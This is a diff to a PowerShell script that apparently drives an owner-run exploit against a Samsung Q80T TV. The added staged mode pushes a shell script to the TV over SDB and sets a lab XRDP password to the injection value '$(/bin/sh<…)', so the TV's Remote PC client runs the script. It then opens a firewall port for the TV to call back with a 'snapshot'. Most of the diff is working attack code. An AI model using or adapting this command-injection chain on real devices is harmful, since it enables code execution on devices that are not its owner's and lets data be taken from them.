@@ -1,6 +1,6 @@
 # Owner-operated bounded snapshot trial. Requires the existing disposable lab.
 [CmdletBinding()]
-param([Parameter(Mandatory=$true)][ValidateSet('Doctor','Prepare','Listen','Restore')][string]$Action)
+param([Parameter(Mandatory=$true)][ValidateSet('Doctor','Prepare','PrepareStaged','Listen','ListenStaged','Restore')][string]$Action)
 $ErrorActionPreference = 'Stop'
 $root = (Resolve-Path (Join-Path $PSScriptRoot '..\..')).Path
 $lab = Join-Path $root '.local\tiz0wn-lab'
@@ -118,6 +118,35 @@ function Rotate([string]$password) {
     $lines | Set-Content -LiteralPath $envFile -Encoding ASCII
     Invoke-LabCompose -composeArgs @('up', '-d', '--force-recreate', '--no-build')
 }
+function Assert-XrdpListening {
+    # Compose can return zero while the lab container remains Created; recover
+    # only the dedicated lab container, then verify the actual host TCP port.
+    $name = 'danstv-remote-pc-lab'
+    for ($attempt = 0; $attempt -lt 20; $attempt++) {
+        $status = ((& docker inspect --format '{{.State.Status}}' $name 2>$null) | Out-String).Trim()
+        if ($status -eq 'created') {
+            & docker start $name | Out-Null
+            if ($LASTEXITCODE -ne 0) { throw 'Disposable XRDP container could not start.' }
+        }
+        if ($status -eq 'running') {
+            $socket = New-Object Net.Sockets.TcpClient
+            try {
+                $pending = $socket.BeginConnect([string]$owner.pc, 3389, $null, $null)
+                if ($pending.AsyncWaitHandle.WaitOne(650)) {
+                    $socket.EndConnect($pending)
+                    return
+                }
+            } catch {
+                # TCP listener is not ready. Keep polling within the bounded window.
+            } finally {
+                $socket.Close()
+            }
+        }
+        Start-Sleep -Milliseconds 350
+    }
+    throw 'XRDP container is not accepting TCP/3389; credentials will be restored.'
+}
+
 if ($Action -eq 'Restore') {
     # Revoke the network listener first; preserve backup until both credentials restore.
     $hadBackup = Test-Path -LiteralPath $backup
@@ -138,6 +167,80 @@ if ($Action -eq 'Restore') {
     }
     return
 }
+if ($Action -eq 'PrepareStaged') {
+    # A safe SDB upload/readback test MUST pass before changing any lab credentials.
+    & $PSCommandPath -Action Doctor | Out-Null
+    $signingFile = Join-Path $root '.local\signing.json'
+    if (-not (Test-Path -LiteralPath $signingFile)) { throw 'Missing private Samsung SDK configuration.' }
+    $signing = Get-Content -LiteralPath $signingFile -Raw | ConvertFrom-Json
+    $sdkDir = [string]$signing.sdk_path
+    if (-not [IO.Path]::IsPathRooted($sdkDir)) { $sdkDir = Join-Path $root $sdkDir }
+    $sdb = Join-Path $sdkDir 'tools\sdb.exe'
+    if (-not (Test-Path -LiteralPath $sdb -PathType Leaf)) {
+        throw 'SDB executable not found at the configured Samsung SDK path.'
+    }
+    $bytes = New-Object byte[] 12
+    $rng = [Security.Cryptography.RandomNumberGenerator]::Create()
+    try { $rng.GetBytes($bytes) } finally { $rng.Dispose() }
+    $token = ([BitConverter]::ToString($bytes) -replace '-','').ToLowerInvariant()
+    $stageRemote = '/home/owner/share/tmp/sdk_tools/dtvs' + $token.Substring(0,8) + '.sh'
+    $stageLocal = Join-Path $lab ('stage-' + $token + '.sh')
+    $stageVerified = Join-Path $lab ('stage-verified-' + $token + '.sh')
+    $report = Join-Path $lab ('snapshot-' + $token + '.txt')
+    try {
+        & py -3 (Join-Path $PSScriptRoot 'root-bridge.py') --host $owner.pc --tv $owner.tv --token $token --output $report --write-stage $stageLocal --stage-remote $stageRemote | Out-Null
+        if ($LASTEXITCODE -ne 0) { throw 'Unable to prepare the fixed survey in the private lab.' }
+        $serial = ([string]$owner.tv) + ':26101'
+        & $sdb connect $serial | Out-Null
+        if ($LASTEXITCODE -ne 0) { throw 'SDB connection to Q80T failed; no credentials changed.' }
+        $state = ((& $sdb -s $serial get-state 2>&1) | Out-String).Trim()
+        if ($LASTEXITCODE -ne 0 -or $state -ne 'device') {
+            throw 'Q80T SDB transport is not ready; no credentials changed.'
+        }
+        & $sdb -s $serial push $stageLocal $stageRemote | Out-Null
+        if ($LASTEXITCODE -ne 0) { throw 'TV refused the SDB survey staging path; no credentials changed.' }
+        & $sdb -s $serial pull $stageRemote $stageVerified | Out-Null
+        if ($LASTEXITCODE -ne 0 -or -not (Test-Path -LiteralPath $stageVerified)) {
+            throw 'TV SDB pull/readback unavailable; no credentials changed. Do not continue with an unverified staged file.'
+        }
+        $expected = (Get-FileHash -LiteralPath $stageLocal -Algorithm SHA256).Hash
+        $actual = (Get-FileHash -LiteralPath $stageVerified -Algorithm SHA256).Hash
+        if ($expected -cne $actual) {
+            throw 'SDB staged script hash differs from the original; no credentials changed.'
+        }
+    } finally {
+        if (Test-Path -LiteralPath $stageVerified) {
+            Remove-Item -LiteralPath $stageVerified -Force
+        }
+    }
+
+    # The password carries only a short fixed-script invocation, never the
+    # survey body, URL, network address or a long combined shell expression.
+    $probe = '$(/bin/sh<' + $stageRemote + ')'
+    if ($probe.Length -gt 90) { throw 'Short diagnostic trigger unexpectedly long.' }
+    Copy-Item -LiteralPath $envFile -Destination $backup -ErrorAction Stop
+    try {
+        [ordered]@{
+            token=$token; host=$owner.pc; tv=$owner.tv; output=$report;
+            mode='Staged'; stage_remote=$stageRemote
+        } | ConvertTo-Json | Set-Content -LiteralPath $sessionFile -Encoding ASCII
+        Rotate $probe
+        Assert-XrdpListening
+        New-NetFirewallRule -Name $firewall -DisplayName 'DansTV temporary staged snapshot callback' -Direction Inbound -Action Allow -Protocol TCP -LocalAddress $owner.pc -LocalPort 8181 -RemoteAddress $owner.tv -Profile Any | Out-Null
+    } catch {
+        Write-Warning 'Staged preparation failed; restoring the dedicated lab credentials.'
+        try { & $PSCommandPath -Action Restore } catch {
+            Write-Warning 'Automatic credential recovery failed; original backup is preserved. Run -Action Restore.'
+        }
+        throw
+    }
+    Write-Output 'STAGED-READY: TV script readback verified; XRDP TCP listener ready.'
+    Write-Output 'Temporary TV Remote PC password (do not share it or lab.env):'
+    Write-Output $probe
+    Write-Output 'Next: run root-bridge.ps1 -Action ListenStaged, then open Remote PC and Shared Folder once.'
+    return
+}
+
 if ($Action -eq 'Prepare') {
     if ((Test-Path $backup) -or (Test-Path $sessionFile) -or (Test-Path (Join-Path $lab 'lab.env.before-uid'))) {
         throw 'An earlier trial is active. Restore it before preparing a new one.'
@@ -170,12 +273,22 @@ if ($Action -eq 'Prepare') {
 }
 if (-not (Test-Path $backup)) { throw 'Prepare the snapshot trial first.' }
 $session = Get-Content -LiteralPath $sessionFile -Raw | ConvertFrom-Json
+if ($Action -eq 'Listen' -and $session.mode -eq 'Staged') {
+    throw 'This is a staged session. Use -Action ListenStaged.'
+}
+if ($Action -eq 'ListenStaged' -and $session.mode -ne 'Staged') {
+    throw 'This is not a staged session. Use -Action Listen.'
+}
 if ($session.host -ne $owner.pc -or $session.tv -ne $owner.tv -or $session.token -notmatch '^[0-9a-f]{24}$') {
     throw 'Invalid snapshot session.'
 }
 try {
-    & py -3 (Join-Path $PSScriptRoot 'root-bridge.py') --host $session.host --tv $session.tv --token $session.token --output $session.output
+    $argsForReceiver = @('--host', [string]$session.host, '--tv', [string]$session.tv, '--token', [string]$session.token, '--output', [string]$session.output)
+    if ($Action -eq 'ListenStaged') { $argsForReceiver += '--staged' }
+    & py -3 (Join-Path $PSScriptRoot 'root-bridge.py') @argsForReceiver
     if ($LASTEXITCODE -ne 0) { throw 'No validated snapshot received.' }
+    & py -3 (Join-Path $PSScriptRoot 'assess-snapshot.py') --report $session.output
+    if ($LASTEXITCODE -ne 0) { throw 'Snapshot saved but assessment did not pass.' }
 } finally {
     # Listener is synchronous and has exited. Credentials remain recoverable on failure.
     & $PSCommandPath -Action Restore
